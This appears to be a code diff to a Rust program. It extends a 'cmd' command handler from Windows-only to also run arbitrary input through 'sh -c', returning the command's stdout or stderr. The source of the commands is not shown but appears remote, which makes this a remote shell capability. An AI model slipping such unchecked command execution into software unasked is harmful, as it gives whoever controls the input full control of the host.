@@ -103,31 +103,54 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
           let out: String = (|| -> String {
             match &*command.name {
-                "cmd" => {
-                  let input = match serde_json::to_string(&command.data["input"]) {
-                    Ok(v) => v,
-                    Err(_) => "echo Hello, World!".to_string()
-                  };
+              "cmd" => {
+                let input = match serde_json::to_string(&command.data["input"]) {
+                  Ok(v) => {
+                    let mut chars = v.chars();
+                    chars.next();
+                    chars.next_back();
+                    String::from(chars.as_str())
+                  },
+                  Err(_) => "echo Hello".to_string(),
+                };
 
-                  if env::consts::OS != "windows" {
-                    return "Unsupported OS.".to_string();
+                let mut program = "sh";
+                let mut arg0 = "-c";
+
+                if env::consts::OS == "windows" {
+                  program = "cmd";
+                  arg0 = "/C";
+                }
+
+                println!("{}", input);
+
+                let mut cmd = std::process::Command::new(program);
+                cmd.arg(arg0);
+                cmd.arg(input);
+
+                let output = match cmd.output() {
+                  Ok(v) => v,
+                  Err(_) => {
+                    return "Error while running command.".to_string();
                   }
-
-                  let output = match std::process::Command::new("cmd").args(&["/C", &input]).output() {
+                };
+                let stdout = match String::from_utf8(output.stdout) {
+                  Ok(v) => v,
+                  Err(_) => "Could not parse command.".to_string(),
+                };
+                if stdout == "" {
+                  let stderr = match String::from_utf8(output.stderr) {
                     Ok(v) => v,
-                    Err(_) => {
-                      return "Error while running command.".to_string();
-                    }
+                    Err(_) => "Could not parse command.".to_string(),
                   };
-                  let stdout = match String::from_utf8(output.stdout) {
-                    Ok(v) => v,
-                    Err(_) => "Could not parse command.".to_string()
-                  };
-                  return stdout
-                },
-                _ => {
-                  return "Unknown command.".to_string()
-                },
+                  if stderr == "" {
+                    return "No output.".to_string();
+                  }
+                  return stderr;
+                }
+                return stdout;
+              }
+              _ => return "Unknown command.".to_string(),
             };
           })();
 
